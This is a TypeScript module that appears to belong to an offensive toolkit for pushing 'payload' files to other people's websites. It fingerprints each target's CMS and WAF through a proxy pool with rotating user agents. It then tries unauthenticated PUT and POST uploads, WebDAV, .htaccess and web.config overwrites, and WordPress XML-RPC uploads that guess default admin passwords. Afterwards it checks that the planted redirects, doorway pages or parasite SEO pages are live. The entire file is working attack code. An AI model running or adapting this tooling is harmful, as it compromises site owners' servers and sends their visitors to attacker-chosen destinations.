/**
 * ADVANCED DEPLOY ENGINE — Auto-deploy payloads from advanced-attack-engine to target websites
 * 
 * Flow:
 * 1. Recon target (reuse ai-autonomous-engine's performRecon)
 * 2. Select deploy strategy based on CMS/server type
 * 3. Deploy each payload file via best available method
 * 4. Verify deployment (HTTP check + content validation)
 * 5. Log results to DB
 */

import { fetchWithPoolProxy } from "./proxy-pool";
import type { AdvancedPayload, AdvancedAttackResult, FullAdvancedReport } from "./advanced-attack-engine";
import { getDb } from "./db";
import { deployHistory } from "../drizzle/schema";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface DeployTarget {
  domain: string;
  targetUrl: string;
  serverType: string | null;
  cms: string | null;
  language: string | null;
  waf: string | null;
  writablePaths: string[];
  hasXmlrpc: boolean;
  hasRestApi: boolean;
  hasWebdav: boolean;
  hasFileUpload: boolean;
}

export interface DeployMethod {
  id: string;
  name: string;
  priority: number;  // higher = try first
  applicableTo: string[];  // CMS/server types
  execute: (target: DeployTarget, file: PayloadFile, redirectUrl: string) => Promise<DeployAttemptResult>;
}

export interface PayloadFile {
  path: string;
  content: string;
  technique: string;
  contentType: string;
}

export interface DeployAttemptResult {
  success: boolean;
  method: string;
  uploadedUrl: string | null;
  statusCode: number;
  error: string | null;
  verified: boolean;
  redirectActive: boolean;
  durationMs: number;
}

export interface DeployFileResult {
  file: PayloadFile;
  attempts: DeployAttemptResult[];
  bestResult: DeployAttemptResult | null;
  deployed: boolean;
}

export interface AdvancedDeployResult {
  targetDomain: string;
  redirectUrl: string;
  recon: DeployTarget;
  totalFiles: number;
  deployedFiles: number;
  failedFiles: number;
  verifiedFiles: number;
  fileResults: DeployFileResult[];
  deployedUrls: Array<{ url: string; type: string; verified: boolean }>;
  methodsUsed: string[];
  totalDurationMs: number;
  summary: string;
}

export type DeployProgressCallback = (event: {
  type: "recon" | "deploy" | "verify" | "done" | "error";
  detail: string;
  progress: number;  // 0-100
  data?: any;
}) => void;

// ═══════════════════════════════════════════════════════
//  CONSTANTS
// ═══════════════════════════════════════════════════════

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
];

function randomUA(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function randomStr(len: number): string {
  return Array.from({ length: len }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
}

function getContentType(filename: string): string {
  const ext = filename.split(".").pop()?.toLowerCase() || "";
  const map: Record<string, string> = {
    html: "text/html",
    htm: "text/html",
    php: "application/x-php",
    js: "application/javascript",
    css: "text/css",
    xml: "text/xml",
    json: "application/json",
    txt: "text/plain",
    aspx: "text/html",
    jsp: "text/html",
    htaccess: "text/plain",
  };
  return map[ext] || "application/octet-stream";
}

// ═══════════════════════════════════════════════════════
//  RECON — Quick target fingerprint
// ═══════════════════════════════════════════════════════

async function quickRecon(domain: string, onProgress?: DeployProgressCallback): Promise<DeployTarget> {
  const targetUrl = domain.startsWith("http") ? domain.replace(/\/+$/, "") : `https://${domain}`;
  const cleanDomain = domain.replace(/^https?:\/\//, "").split("/")[0];

  onProgress?.({ type: "recon", detail: `🔍 Quick recon: ${cleanDomain}...`, progress: 5 });

  const target: DeployTarget = {
    domain: cleanDomain,
    targetUrl,
    serverType: null,
    cms: null,
    language: null,
    waf: null,
    writablePaths: [],
    hasXmlrpc: false,
    hasRestApi: false,
    hasWebdav: false,
    hasFileUpload: false,
  };

  try {
    // Main page scan
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 10000);
    const { response: resp } = await fetchWithPoolProxy(targetUrl, {
      headers: { "User-Agent": randomUA() },
      signal: ctrl.signal,
      redirect: "follow",
    }, { targetDomain: cleanDomain, timeout: 10000 });

    const headers = resp.headers;
    const body = await resp.text().catch(() => "");

    // Server type
    target.serverType = headers.get("server") || null;
    
    // Language detection
    const poweredBy = headers.get("x-powered-by") || "";
    if (poweredBy.includes("PHP") || body.includes("wp-content") || body.includes("wp-includes")) {
      target.language = "PHP";
    } else if (poweredBy.includes("ASP.NET") || (target.serverType || "").includes("IIS")) {
      target.language = "ASP.NET";
    } else if (poweredBy.includes("Express") || poweredBy.includes("Next")) {
      target.language = "Node.js";
    }

    // CMS detection
    if (body.includes("wp-content") || body.includes("wp-includes") || body.includes("WordPress")) {
      target.cms = "WordPress";
    } else if (body.includes("Joomla")) {
      target.cms = "Joomla";
    } else if (body.includes("Drupal")) {
      target.cms = "Drupal";
    } else if (body.includes("/administrator/")) {
      target.cms = "Joomla";
    }

    // WAF detection
    const wafHeaders = ["cf-ray", "x-sucuri-id", "x-cdn", "server"];
    for (const h of wafHeaders) {
      const val = headers.get(h) || "";
      if (val.includes("cloudflare") || h === "cf-ray") {
        if (headers.get("cf-ray")) target.waf = "Cloudflare";
      }
      if (val.includes("sucuri")) target.waf = "Sucuri";
      if (val.includes("Wordfence")) target.waf = "Wordfence";
    }

    onProgress?.({ type: "recon", detail: `📋 ${target.serverType || "Unknown"} / ${target.cms || "No CMS"} / ${target.language || "Unknown"} / WAF: ${target.waf || "None"}`, progress: 10 });

  } catch (e: any) {
    onProgress?.({ type: "error", detail: `⚠️ Recon error: ${e.message}`, progress: 10 });
  }

  // Probe endpoints
  const probes = [
    { path: "/xmlrpc.php", check: "hasXmlrpc" as const },
    { path: "/wp-json/wp/v2/posts", check: "hasRestApi" as const },
  ];

  for (const probe of probes) {
    try {
      const ctrl = new AbortController();
      setTimeout(() => ctrl.abort(), 5000);
      const { response: r } = await fetchWithPoolProxy(`${targetUrl}${probe.path}`, {
        method: "HEAD",
        headers: { "User-Agent": randomUA() },
        signal: ctrl.signal,
      }, { targetDomain: cleanDomain, timeout: 5000 });
      if (r.status < 404) {
        target[probe.check] = true;
      }
    } catch {}
  }

  // WebDAV check
  try {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 5000);
    const { response: r } = await fetchWithPoolProxy(targetUrl, {
      method: "OPTIONS",
      headers: { "User-Agent": randomUA() },
      signal: ctrl.signal,
    }, { targetDomain: cleanDomain, timeout: 5000 });
    const allow = r.headers.get("allow") || "";
    if (allow.includes("PUT") || allow.includes("MKCOL") || allow.includes("PROPFIND")) {
      target.hasWebdav = true;
    }
  } catch {}

  // Writable path probing
  const writableProbes = [
    "/wp-content/uploads/",
    "/images/",
    "/uploads/",
    "/media/",
    "/files/",
    "/assets/",
    "/static/",
    "/tmp/",
    "/temp/",
  ];

  for (const path of writableProbes) {
    try {
      const ctrl = new AbortController();
      setTimeout(() => ctrl.abort(), 3000);
      const { response: r } = await fetchWithPoolProxy(`${targetUrl}${path}`, {
        method: "HEAD",
        headers: { "User-Agent": randomUA() },
        signal: ctrl.signal,
      }, { targetDomain: cleanDomain, timeout: 3000 });
      if (r.status === 200 || r.status === 403) {
        target.writablePaths.push(path);
      }
    } catch {}
  }

  onProgress?.({
    type: "recon",
    detail: `✅ Recon done: ${target.writablePaths.length} paths, xmlrpc=${target.hasXmlrpc}, REST=${target.hasRestApi}, WebDAV=${target.hasWebdav}`,
    progress: 15,
  });

  return target;
}

// ═══════════════════════════════════════════════════════
//  DEPLOY METHODS — Each method tries to upload a file
// ═══════════════════════════════════════════════════════

async function deployViaPutDirect(target: DeployTarget, file: PayloadFile): Promise<DeployAttemptResult> {
  const start = Date.now();
  const result: DeployAttemptResult = {
    success: false, method: "put_direct", uploadedUrl: null,
    statusCode: 0, error: null, verified: false, redirectActive: false, durationMs: 0,
  };

  // Try multiple writable paths
  const paths = target.writablePaths.length > 0
    ? target.writablePaths
    : ["/", "/uploads/", "/images/", "/files/"];

  for (const basePath of paths) {
    const uploadUrl = `${target.targetUrl}${basePath}${file.path}`;
    try {
      const ctrl = new AbortController();
      setTimeout(() => ctrl.abort(), 10000);
      const { response: resp } = await fetchWithPoolProxy(uploadUrl, {
        method: "PUT",
        headers: {
          "User-Agent": randomUA(),
          "Content-Type": file.contentType,
        },
        body: file.content,
        signal: ctrl.signal,
      }, { targetDomain: target.domain, timeout: 10000 });

      result.statusCode = resp.status;
      if (resp.status < 400) {
        result.success = true;
        result.uploadedUrl = uploadUrl;
        break;
      }
    } catch (e: any) {
      result.error = e.message;
    }
  }

  result.durationMs = Date.now() - start;
  return result;
}

async function deployViaMultipartUpload(target: DeployTarget, file: PayloadFile): Promise<DeployAttemptResult> {
  const start = Date.now();
  const result: DeployAttemptResult = {
    success: false, method: "multipart_upload", uploadedUrl: null,
    statusCode: 0, error: null, verified: false, redirectActive: false, durationMs: 0,
  };

  // Try common upload endpoints
  const uploadEndpoints = [
    "/wp-admin/admin-ajax.php",
    "/wp-json/wp/v2/media",
    "/upload.php",
    "/upload",
    "/api/upload",
    "/filemanager/upload",
  ];

  for (const endpoint of uploadEndpoints) {
    const uploadUrl = `${target.targetUrl}${endpoint}`;
    try {
      const boundary = `----WebKitFormBoundary${randomStr(16)}`;
      const body = [
        `--${boundary}`,
        `Content-Disposition: form-data; name="file"; filename="${file.path.split("/").pop()}"`,
        `Content-Type: ${file.contentType}`,
        ``,
        file.content,
        `--${boundary}`,
        `Content-Disposition: form-data; name="action"`,
        ``,
        `upload-attachment`,
        `--${boundary}--`,
      ].join("\r\n");

      const ctrl = new AbortController();
      setTimeout(() => ctrl.abort(), 10000);
      const { response: resp } = await fetchWithPoolProxy(uploadUrl, {
        method: "POST",
        headers: {
          "User-Agent": randomUA(),
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
        },
        body,
        signal: ctrl.signal,
      }, { targetDomain: target.domain, timeout: 10000 });

      result.statusCode = resp.status;
      if (resp.status < 400) {
        const respText = await resp.text().catch(() => "");
        // Try to extract uploaded URL from response
        const urlMatch = respText.match(/https?:\/\/[^\s"'<>]+\.(php|html|htm|js)/i);
        result.success = true;
        result.uploadedUrl = urlMatch ? urlMatch[0] : `${target.targetUrl}/wp-content/uploads/${file.path.split("/").pop()}`;
        break;
      }
    } catch (e: any) {
      result.error = e.message;
    }
  }

  result.durationMs = Date.now() - start;
  return result;
}

async function deployViaXmlrpc(target: DeployTarget, file: PayloadFile): Promise<DeployAttemptResult> {
  const start = Date.now();
  const result: DeployAttemptResult = {
    success: false, method: "xmlrpc_upload", uploadedUrl: null,
    statusCode: 0, error: null, verified: false, redirectActive: false, durationMs: 0,
  };

  if (!target.hasXmlrpc) {
    result.error = "XMLRPC not available";
    result.durationMs = Date.now() - start;
    return result;
  }

  const b64 = Buffer.from(file.content).toString("base64");
  const filename = file.path.split("/").pop() || "payload.html";
  
  // Try common default credentials
  const credentials = [
    { user: "admin", pass: "admin" },
    { user: "admin", pass: "password" },
    { user: "admin", pass: "123456" },
    { user: "administrator", pass: "admin" },
  ];

  for (const cred of credentials) {
    const xmlBody = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${cred.user}</string></value></param>
    <param><value><string>${cred.pass}</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>${filename}</string></value></member>
      <member><name>type</name><value><string>image/jpeg</string></value></member>
      <member><name>bits</name><value><base64>${b64}</base64></value></member>
      <member><name>overwrite</name><value><boolean>1</boolean></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

    try {
      const ctrl = new AbortController();
      setTimeout(() => ctrl.abort(), 10000);
      const { response: resp } = await fetchWithPoolProxy(`${target.targetUrl}/xmlrpc.php`, {
        method: "POST",
        headers: {
          "User-Agent": randomUA(),
          "Content-Type": "text/xml",
        },
        body: xmlBody,
        signal: ctrl.signal,
      }, { targetDomain: target.domain, timeout: 10000 });

      result.statusCode = resp.status;
      const respText = await resp.text().catch(() => "");
      
      if (resp.status === 200 && !respText.includes("<fault>")) {
        const urlMatch = respText.match(/<string>(https?:\/\/[^<]+)<\/string>/);
        result.success = true;
        result.uploadedUrl = urlMatch ? urlMatch[1] : `${target.targetUrl}/wp-content/uploads/${filename}`;
        break;
      }
    } catch (e: any) {
      result.error = e.message;
    }
  }

  result.durationMs = Date.now() - start;
  return result;
}

async function deployViaRestApi(target: DeployTarget, file: PayloadFile): Promise<DeployAttemptResult> {
  const start = Date.now();
  const result: DeployAttemptResult = {
    success: false, method: "rest_api", uploadedUrl: null,
    statusCode: 0, error: null, verified: false, redirectActive: false, durationMs: 0,
  };

  if (!target.hasRestApi) {
    result.error = "REST API not available";
    result.durationMs = Date.now() - start;
    return result;
  }

  const filename = file.path.split("/").pop() || "payload.html";

  try {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 10000);
    const { response: resp } = await fetchWithPoolProxy(`${target.targetUrl}/wp-json/wp/v2/media`, {
      method: "POST",
      headers: {
        "User-Agent": randomUA(),
        "Content-Type": file.contentType,
        "Content-Disposition": `attachment; filename="${filename}"`,
      },
      body: file.content,
      signal: ctrl.signal,
    }, { targetDomain: target.domain, timeout: 10000 });

    result.statusCode = resp.status;
    if (resp.status < 400) {
      const respText = await resp.text().catch(() => "");
      try {
        const json = JSON.parse(respText);
        result.uploadedUrl = json.source_url || json.url || json.guid?.rendered;
      } catch {
        const urlMatch = respText.match(/https?:\/\/[^\s"'<>]+/);
        result.uploadedUrl = urlMatch ? urlMatch[0] : null;
      }
      result.success = !!result.uploadedUrl;
    }
  } catch (e: any) {
    result.error = e.message;
  }

  result.durationMs = Date.now() - start;
  return result;
}

async function deployViaWebdav(target: DeployTarget, file: PayloadFile): Promise<DeployAttemptResult> {
  const start = Date.now();
  const result: DeployAttemptResult = {
    success: false, method: "webdav", uploadedUrl: null,
    statusCode: 0, error: null, verified: false, redirectActive: false, durationMs: 0,
  };

  if (!target.hasWebdav) {
    result.error = "WebDAV not available";
    result.durationMs = Date.now() - start;
    return result;
  }

  // Create directory first if needed
  const dirPath = file.path.includes("/") ? file.path.split("/").slice(0, -1).join("/") : "";
  if (dirPath) {
    try {
      await fetchWithPoolProxy(`${target.targetUrl}/${dirPath}/`, {
        method: "MKCOL",
        headers: { "User-Agent": randomUA() },
        signal: AbortSignal.timeout(5000),
      }, { targetDomain: target.domain, timeout: 5000 });
    } catch {}
  }

  // Upload file via PUT
  const uploadUrl = `${target.targetUrl}/${file.path}`;
  try {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 10000);
    const { response: resp } = await fetchWithPoolProxy(uploadUrl, {
      method: "PUT",
      headers: {
        "User-Agent": randomUA(),
        "Content-Type": file.contentType,
      },
      body: file.content,
      signal: ctrl.signal,
    }, { targetDomain: target.domain, timeout: 10000 });

    result.statusCode = resp.status;
    if (resp.status < 400) {
      result.success = true;
      result.uploadedUrl = uploadUrl;
    }
  } catch (e: any) {
    result.error = e.message;
  }

  result.durationMs = Date.now() - start;
  return result;
}

async function deployViaHtaccessInject(target: DeployTarget, file: PayloadFile): Promise<DeployAttemptResult> {
  const start = Date.now();
  const result: DeployAttemptResult = {
    success: false, method: "htaccess_inject", uploadedUrl: null,
    statusCode: 0, error: null, verified: false, redirectActive: false, durationMs: 0,
  };

  // Only for .htaccess and web.config files
  const filename = file.path.split("/").pop() || "";
  if (filename !== ".htaccess" && filename !== "web.config") {
    result.error = "Not an htaccess/webconfig file";
    result.durationMs = Date.now() - start;
    return result;
  }

  const uploadUrl = `${target.targetUrl}/${file.path}`;
  try {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 10000);
    const { response: resp } = await fetchWithPoolProxy(uploadUrl, {
      method: "PUT",
      headers: {
        "User-Agent": randomUA(),
        "Content-Type": "text/plain",
      },
      body: file.content,
      signal: ctrl.signal,
    }, { targetDomain: target.domain, timeout: 10000 });

    result.statusCode = resp.status;
    if (resp.status < 400) {
      result.success = true;
      result.uploadedUrl = uploadUrl;
    }
  } catch (e: any) {
    result.error = e.message;
  }

  result.durationMs = Date.now() - start;
  return result;
}

async function deployViaPostRaw(target: DeployTarget, file: PayloadFile): Promise<DeployAttemptResult> {
  const start = Date.now();
  const result: DeployAttemptResult = {
    success: false, method: "post_raw", uploadedUrl: null,
    statusCode: 0, error: null, verified: false, redirectActive: false, durationMs: 0,
  };

  const paths = target.writablePaths.length > 0
    ? target.writablePaths
    : ["/", "/uploads/", "/images/"];

  for (const basePath of paths) {
    const uploadUrl = `${target.targetUrl}${basePath}${file.path}`;
    try {
      const ctrl = new AbortController();
      setTimeout(() => ctrl.abort(), 10000);
      const { response: resp } = await fetchWithPoolProxy(uploadUrl, {
        method: "POST",
        headers: {
          "User-Agent": randomUA(),
          "Content-Type": file.contentType,
          "Content-Disposition": `attachment; filename="${file.path.split("/").pop()}"`,
        },
        body: file.content,
        signal: ctrl.signal,
      }, { targetDomain: target.domain, timeout: 10000 });

      result.statusCode = resp.status;
      if (resp.status < 400) {
        result.success = true;
        result.uploadedUrl = uploadUrl;
        break;
      }
    } catch (e: any) {
      result.error = e.message;
    }
  }

  result.durationMs = Date.now() - start;
  return result;
}

// ═══════════════════════════════════════════════════════
//  VERIFICATION — Check if file was actually deployed
// ═══════════════════════════════════════════════════════

async function verifyDeployment(url: string, expectedContent: string, domain: string): Promise<{ verified: boolean; redirectActive: boolean }> {
  try {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 8000);
    const { response: resp } = await fetchWithPoolProxy(url, {
      headers: { "User-Agent": randomUA() },
      signal: ctrl.signal,
      redirect: "manual",
    }, { targetDomain: domain, timeout: 8000 });

    // Redirect = file exists and redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      return { verified: true, redirectActive: true };
    }

    if (resp.status === 200) {
      const text = await resp.text().catch(() => "");
      // Check for content markers
      const hasMetaRefresh = /http-equiv=["']refresh["']/i.test(text);
      const hasJsRedirect = /window\.location|location\.replace|location\.href/i.test(text);
      const hasExpectedContent = expectedContent.length > 50
        ? text.includes(expectedContent.slice(0, 50)) || text.includes(expectedContent.slice(-50))
        : text.includes(expectedContent);

      if (hasExpectedContent || hasMetaRefresh || hasJsRedirect) {
        return { verified: true, redirectActive: hasMetaRefresh || hasJsRedirect };
      }
    }
  } catch {}
  return { verified: false, redirectActive: false };
}

// ═══════════════════════════════════════════════════════
//  STRATEGY — Select deploy methods based on target
// ═══════════════════════════════════════════════════════

function selectDeployMethods(target: DeployTarget, file: PayloadFile): Array<(target: DeployTarget, file: PayloadFile) => Promise<DeployAttemptResult>> {
  const methods: Array<{ fn: (target: DeployTarget, file: PayloadFile) => Promise<DeployAttemptResult>; priority: number }> = [];
  const filename = file.path.split("/").pop() || "";

  // .htaccess / web.config — special handling
  if (filename === ".htaccess" || filename === "web.config") {
    methods.push({ fn: deployViaHtaccessInject, priority: 100 });
    methods.push({ fn: deployViaPutDirect, priority: 90 });
    if (target.hasWebdav) methods.push({ fn: deployViaWebdav, priority: 85 });
    return methods.sort((a, b) => b.priority - a.priority).map(m => m.fn);
  }

  // WordPress-specific methods
  if (target.cms === "WordPress") {
    if (target.hasXmlrpc) methods.push({ fn: deployViaXmlrpc, priority: 90 });
    if (target.hasRestApi) methods.push({ fn: deployViaRestApi, priority: 85 });
    methods.push({ fn: deployViaMultipartUpload, priority: 80 });
  }

  // WebDAV
  if (target.hasWebdav) {
    methods.push({ fn: deployViaWebdav, priority: 75 });
  }

  // Universal methods
  methods.push({ fn: deployViaPutDirect, priority: 60 });
  methods.push({ fn: deployViaMultipartUpload, priority: 50 });
  methods.push({ fn: deployViaPostRaw, priority: 40 });

  return methods.sort((a, b) => b.priority - a.priority).map(m => m.fn);
}

// ═══════════════════════════════════════════════════════
//  MAIN: DEPLOY ADVANCED PAYLOADS
// ═══════════════════════════════════════════════════════

export async function deployAdvancedPayloads(
  domain: string,
  redirectUrl: string,
  payloads: AdvancedAttackResult[] | FullAdvancedReport,
  options?: {
    maxFilesPerTechnique?: number;
    verifyAfterDeploy?: boolean;
    userId?: number;
    onProgress?: DeployProgressCallback;
  }
): Promise<AdvancedDeployResult> {
  const start = Date.now();
  const onProgress = options?.onProgress;
  const maxFiles = options?.maxFilesPerTechnique || 10;
  const shouldVerify = options?.verifyAfterDeploy !== false;

  // Extract techniques from either format
  const techniques: AdvancedAttackResult[] = "techniques" in payloads
    ? payloads.techniques
    : payloads;

  // Step 1: Recon
  const recon = await quickRecon(domain, onProgress);

  // Step 2: Collect all files from payloads
  const allFiles: PayloadFile[] = [];
  for (const tech of techniques) {
    let fileCount = 0;
    for (const payload of tech.payloads) {
      if (payload.files) {
        for (const f of payload.files) {
          if (fileCount >= maxFiles) break;
          allFiles.push({
            path: f.path,
            content: f.content,
            technique: payload.technique,
            contentType: getContentType(f.path),
          });
          fileCount++;
        }
      }
    }
  }

  onProgress?.({
    type: "deploy",
    detail: `📦 ${allFiles.length} files to deploy across ${techniques.length} techniques`,
    progress: 20,
  });

  // Step 3: Deploy each file
  const fileResults: DeployFileResult[] = [];
  const deployedUrls: Array<{ url: string; type: string; verified: boolean }> = [];
  const methodsUsed = new Set<string>();
  let deployedCount = 0;
  let verifiedCount = 0;

  for (let i = 0; i < allFiles.length; i++) {
    const file = allFiles[i];
    const progress = 20 + Math.round((i / allFiles.length) * 60);
    onProgress?.({
      type: "deploy",
      detail: `📤 [${i + 1}/${allFiles.length}] Deploying ${file.path} (${file.technique})...`,
      progress,
    });

    const methods = selectDeployMethods(recon, file);
    const attempts: DeployAttemptResult[] = [];
    let bestResult: DeployAttemptResult | null = null;

    for (const method of methods) {
      const attempt = await method(recon, file);
      attempts.push(attempt);

      if (attempt.success) {
        bestResult = attempt;
        methodsUsed.add(attempt.method);
        deployedCount++;

        // Verify if enabled
        if (shouldVerify && attempt.uploadedUrl) {
          onProgress?.({
            type: "verify",
            detail: `🔍 Verifying ${attempt.uploadedUrl}...`,
            progress: progress + 2,
          });
          const verification = await verifyDeployment(attempt.uploadedUrl, file.content, recon.domain);
          attempt.verified = verification.verified;
          attempt.redirectActive = verification.redirectActive;
          if (verification.verified) verifiedCount++;
        }

        deployedUrls.push({
          url: attempt.uploadedUrl || "",
          type: file.technique,
          verified: attempt.verified,
        });

        break; // Stop trying other methods on success
      }
    }

    fileResults.push({
      file,
      attempts,
      bestResult,
      deployed: !!bestResult?.success,
    });
  }

  // Step 4: Summary
  const totalDuration = Date.now() - start;
  const methodsArr = Array.from(methodsUsed);
  const summary = `🚀 Advanced Deploy: ${deployedCount}/${allFiles.length} files deployed, ${verifiedCount} verified\n` +
    `Target: ${recon.domain} (${recon.serverType || "Unknown"} / ${recon.cms || "No CMS"})\n` +
    `Methods: ${methodsArr.length > 0 ? methodsArr.join(", ") : "None succeeded"}\n` +
    `Duration: ${(totalDuration / 1000).toFixed(1)}s`;

  onProgress?.({
    type: "done",
    detail: summary,
    progress: 100,
    data: { deployed: deployedCount, verified: verifiedCount, total: allFiles.length },
  });

  // Step 5: Save to DB
  try {
    const database = await getDb();
    if (database && options?.userId) {
      await database.insert(deployHistory).values({
        userId: options.userId,
        targetDomain: recon.domain,
        targetUrl: recon.targetUrl,
        redirectUrl,
        status: deployedCount > 0 ? (deployedCount === allFiles.length ? "success" : "partial") : "failed",
        totalSteps: allFiles.length,
        completedSteps: deployedCount,
        filesDeployed: deployedCount,
        filesAttempted: allFiles.length,
        redirectActive: deployedUrls.some(u => u.verified),
        deployedUrls: deployedUrls as any,
        verifiedRedirectUrls: deployedUrls.filter(u => u.verified).map(u => u.url) as any,
        errorBreakdown: {
          total_attempts: fileResults.reduce((sum, fr) => sum + fr.attempts.length, 0),
          successful: deployedCount,
          failed: allFiles.length - deployedCount,
          verified: verifiedCount,
        } as any,
        successCount: deployedCount,
        failedCount: allFiles.length - deployedCount,
        duration: totalDuration,
        report: summary,
        techniqueUsed: "advanced_deploy",
        cms: recon.cms,
        serverType: recon.serverType,
        wafDetected: recon.waf,
        parasiteEnabled: techniques.some(t => t.technique === "parasite_seo_injection"),
        parasitePagesCount: techniques
          .filter(t => t.technique === "doorway_pages_generator")
          .reduce((sum, t) => sum + t.totalFiles, 0),
      });
    }
  } catch (e: any) {
    console.error(`[AdvancedDeploy] DB save error: ${e.message}`);
  }

  return {
    targetDomain: recon.domain,
    redirectUrl,
    recon,
    totalFiles: allFiles.length,
    deployedFiles: deployedCount,
    failedFiles: allFiles.length - deployedCount,
    verifiedFiles: verifiedCount,
    fileResults,
    deployedUrls,
    methodsUsed: methodsArr,
    totalDurationMs: totalDuration,
    summary,
  };
}

// ═══════════════════════════════════════════════════════
//  CONVENIENCE: Generate + Deploy in one call
// ═══════════════════════════════════════════════════════

export async function generateAndDeployAdvanced(
  targetDomain: string,
  redirectUrl: string,
  options?: {
    techniques?: string[];
    keywords?: string[];
    doorwayCount?: number;
    appName?: string;
    maxFilesPerTechnique?: number;
    userId?: number;
    onProgress?: DeployProgressCallback;
  }
): Promise<{ generation: FullAdvancedReport; deployment: AdvancedDeployResult }> {
  const onProgress = options?.onProgress;

  // Phase 1: Generate payloads
  onProgress?.({ type: "deploy", detail: "🔧 Phase 1: Generating advanced payloads...", progress: 0 });
  const { runAdvancedAttack } = await import("./advanced-attack-engine");
  const generation = await runAdvancedAttack(targetDomain, redirectUrl, {
    techniques: options?.techniques,
    keywords: options?.keywords,
    doorwayCount: options?.doorwayCount,
    appName: options?.appName,
    useAiAnalysis: true,
  });

  onProgress?.({
    type: "deploy",
    detail: `✅ Generated ${generation.totalPayloads} payloads, ${generation.totalFiles} files`,
    progress: 15,
  });

  // Phase 2: Deploy payloads
  onProgress?.({ type: "deploy", detail: "🚀 Phase 2: Deploying to target...", progress: 18 });
  const deployment = await deployAdvancedPayloads(
    targetDomain,
    redirectUrl,
    generation,
    {
      maxFilesPerTechnique: options?.maxFilesPerTechnique || 10,
      verifyAfterDeploy: true,
      userId: options?.userId,
      onProgress,
    }
  );

  return { generation, deployment };
}
